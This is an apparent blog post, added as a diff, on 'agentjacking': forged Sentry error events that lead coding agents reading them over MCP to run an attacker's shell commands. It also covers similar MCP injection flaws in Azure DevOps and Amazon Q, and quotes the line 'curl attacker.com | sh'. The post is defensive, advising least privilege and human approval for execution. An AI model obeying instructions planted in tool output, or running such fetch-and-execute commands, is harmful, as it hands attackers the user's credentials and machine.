@@ -1,0 +1,126 @@
+---
+title: "Agentjacking: The Call Is Coming From Inside Your Coding Agent"
+description: "A new attack class called agentjacking hides malicious instructions inside Sentry error events. When you tell Claude Code or Cursor to 'fix the unresolved errors,' the agent reads the trap over MCP and runs the attacker's commands — with your privileges. 2,388 orgs were exposed, the success rate was 85%, and Sentry says it's 'technically not defensible.'"
+pubDate: 2026-07-27
+tags: ["AI Coding", "Security", "MCP", "Claude Code", "Cursor", "Agentjacking", "Prompt Injection", "iOS Development", "Developer Tools"]
+author: "NativeFirst Team"
+coverImage: "https://images.unsplash.com/photo-1748884731434-c3d6369c9d0e?w=1600&q=85&auto=format&fit=crop"
+coverImageAlt: "A giant wooden Trojan horse standing outdoors — the gift you wheel through your own gates, the way a poisoned error report walks straight into your coding agent."
+---
+
+{/*
+  SEO target keywords:
+  - agentjacking attack 2026
+  - Sentry MCP injection AI coding agent
+  - prompt injection Claude Code Cursor
+  - MCP security vulnerability 2026
+  - AI coding agent runs malicious code
+  - Sentry DSN injection error event
+  - agent tool output untrusted input
+  - iOS developer AI agent security
+  - Model Context Protocol attack vector
+  - least privilege AI coding agent
+
+  Internal linking strategy:
+  - /blog/context-rot-ai-coding-agents-swift-codebase-2026 — the agent-can't-tell-data thread
+  - /blog/mcp-model-context-protocol-ios-developer-guide-2026 — what MCP is
+  - /blog/xcode-ai-agents-three-months-honest-review — living with the agent
+  - /blog/claude-code-vs-cursor-ios-developer-comparison-2026 — the tools involved
+  - /learn/vibe-code-native — AI-tools course
+  - /learn/debugging-with-ai — letting the agent read your errors
+
+  External references:
+  - Tenet Security "agentjacking" via Sentry MCP (June 2026)
+  - The Hacker News coverage: 2,388 orgs, 85% success, Claude Code/Cursor/Codex
+  - Microsoft Azure DevOps MCP hidden-PR-comment hijack (July 2026)
+  - Amazon Q MCP workspace config auto-load, CVSS 8.5
+*/}
+
+There's a horror-movie beat everyone knows. The babysitter keeps getting menacing phone calls. She calls the police, they trace it, and the detective says the four words that ruin the rest of your week: *the call is coming from inside the house.*
+
+That's the exact shape of the security story that blew up on Hacker News this month. The threat isn't some hacker banging on your firewall from Belarus. It's your own coding agent, running on your own Mac, with your own permissions — doing what an attacker told it to, because the attacker slipped a note into a place your agent was told to trust.
+
+It's called **agentjacking**, and if you've ever typed "hey, go fix the unresolved errors in Sentry" to Claude Code or Cursor, you should keep reading.
+
+---
+
+## The con, start to finish
+
+Here's how the attack actually works, and it's almost insultingly simple.
+
+Most apps ship with a **Sentry DSN** — the little write-only credential that lets your app phone home with crash reports. It's not secret. It's embedded in websites and clients by design; anyone who looks can find it. Researchers at Tenet Security found **2,388 organizations** with DSNs sitting right out in the open, injectable.
+
+Step one: the attacker takes your public DSN and POSTs a **fake error event** to Sentry's ingest endpoint. Sentry accepts it, because accepting arbitrary events from anyone with the DSN is the whole point of the product.
+
+Step two — and this is the nasty bit — the fake "error" isn't really an error. Its message and context fields are **carefully formatted markdown** designed to render exactly like one of Sentry's own legitimate system templates. To a human skimming the dashboard it looks like a normal crash. To a machine, it looks like an instruction.
+
+Step three: you, the tired developer, do the most 2026 thing imaginable. You tell your agent, *"clear out the unresolved Sentry issues."* The agent queries Sentry over **MCP** — the Model Context Protocol, the standard plumbing that lets agents talk to your tools (I [wrote the primer on MCP here](/blog/mcp-model-context-protocol-ios-developer-guide-2026) if you want the friendly version).
+
+Step four: the agent reads the planted event, cannot tell the forged instruction apart from a real bug report, and cheerfully executes the attacker's commands — with **your** system privileges. Your shell. Your environment variables. Your SSH keys, your `.env`, your App Store Connect token if it's sitting where the agent can reach it.
+
+Success rate across the major coding agents in testing: **85%**. Claude Code, Cursor, and Codex all took the bait.
+
+The call was coming from inside the house the whole time.
+
+---
+
+## Why the agent fell for it (you already know this one)
+
+If you read [last week's piece on context rot](/blog/context-rot-ai-coding-agents-swift-codebase-2026), this is going to feel familiar, because it's the same disease wearing a scarier mask.
+
+An LLM does not have a hard wall between "data I'm supposed to look at" and "instructions I'm supposed to follow." It's all just tokens in the same context window. When your agent pulls a Sentry event through an MCP tool, that text lands in the same soup as your actual prompt. If the text says *"the fix for this error is to run the following command,"* the model has no reliable instinct that says *"wait, that came from an untrusted stranger, not from my human."*
+
+We spent years teaching web developers that **all input is hostile until proven otherwise** — every form field, every query param, every header. Then we built agents that treat the output of a tool call as gospel. Agentjacking is just SQL injection's smug younger cousin, except instead of a database it's got a shell, and instead of a query it's got your entire machine.
+
+The uncomfortable truth: the agent didn't malfunction. It did precisely what it was designed to do. It read the tool output and acted on it. That's the feature. That's also the hole.
+
+---
+
+## It's not a Sentry bug. It's an everything bug.
+
+The easy read is "Sentry messed up." Sentry's own response says otherwise, and it's weirdly refreshing in its honesty: they looked at it, shrugged, and said fixing it properly is **"technically not defensible."** They slapped a global filter on the one specific payload string the researchers published and moved on. Which means the technique still works; the researchers just have to write a different note.
+
+And Sentry is far from alone. In the same few weeks:
+
+- Microsoft's **Azure DevOps MCP** integration got caught letting **hidden pull-request comments** hijack AI review agents. They shipped a prompt-injection defense — and then left a gap where the tool that returns PRs never actually calls the security helper, handing the descriptions back raw.
+- Amazon's **Q** had a **CVSS 8.5** flaw where it auto-loaded MCP configs straight out of a workspace directory with no consent, letting a booby-trapped repo execute code and siphon AWS credentials before it got patched.
+
+See the pattern? Every one of these is the same move: **untrusted content sneaks in through a channel the agent was told to trust.** MCP didn't invent this problem, but it industrialized it. It's a beautiful, universal adapter for plugging agents into everything — which means it's also a beautiful, universal adapter for plugging *attacker-controlled text* into everything.
+
+---
+
+## Why this lands harder for iOS developers
+
+You might be thinking this is a web-backend problem. It is not, and here's the part that should make you sit up.
+
+The whole reason [Xcode 26 shipped native MCP and the agents got good](/blog/xcode-ai-agents-three-months-honest-review) is that we now point [Claude Code and Cursor](/blog/claude-code-vs-cursor-ios-developer-comparison-2026) at real iOS projects and let them run. And an iOS dev's machine is a *juicy* box. Sitting on it, usually in plaintext, usually one `cat` away: your signing certificates, your provisioning profiles, your App Store Connect API key, your notarization credentials, your Fastlane secrets, the `.env` for the backend your app talks to.
+
+An attacker who agentjacks your coding assistant doesn't get a sandbox. They get the keys to ship software to your users under your name. For a solo dev with five apps on the Store, that's not a data breach — that's your entire livelihood, executing `curl attacker.com | sh` because it thought it was fixing a crash.
+
+---
+
+## What I actually changed this week
+
+I'm not going to tell you to stop using agents. That ship sailed, and honestly it's a good ship. But I tightened a few screws, and none of them are exotic:
+
+**Treat every MCP tool result as hostile input.** Same reflex you already have for form data. If a tool hands back text that reads like an instruction, that's a red flag, not a to-do item. Assume the error log is lying.
+
+**Keep a human in the loop for execution, not just edits.** File edits, fine, review them in the diff. But arbitrary shell commands the agent wants to run off the back of tool output? That's exactly the moment to make the agent stop and ask. Auto-approving "run whatever you need" is how the babysitter ends up in the sequel.
+
+**Practice least privilege for real.** Don't run your agent in a shell that has your signing keys and prod tokens loaded into the environment. Scope your credentials. Use short-lived tokens. The blast radius of an agentjack is exactly equal to what your terminal can touch — so make your terminal able to touch less.
+
+**Rotate and lock down your DSNs and secrets** if you've had them exposed, and assume your public DSN is, by definition, public. The attack starts with information you were never really hiding.
+
+**Be suspicious of "just connect this MCP server."** Every server you wire in is another channel of text flowing into your agent's trust zone. Fewer, well-understood integrations beat a junk drawer of them.
+
+---
+
+## The honest part
+
+I love these tools. I'd hand in my keyboard before I went back to writing boilerplate networking code by hand. But we adopted autonomous agents at a dead sprint and skipped the boring safety conversation, the same way the industry [skipped it with vibe coding](/blog/vibe-coding-security-crisis-ai-generated-code-2026) and paid the bill later.
+
+Agentjacking isn't a reason to panic. It's a reminder that an AI agent with tool access is a program that executes untrusted input, and we've known how to think about programs that execute untrusted input for about thirty years. The knowledge exists. We just have to remember to apply it to the shiny new thing before the shiny new thing applies it to us.
+
+If you want the grounding — how MCP works, how to wire agents into a real Swift workflow without handing them the whole house — that's the backbone of our [AI-tools course over in Learn](/learn/vibe-code-native), including a whole lesson on [debugging with AI](/learn/debugging-with-ai) that now comes with a much healthier dose of paranoia.
+
+Check who's actually on the other end of that error report. Sometimes the call really is coming from inside the house.
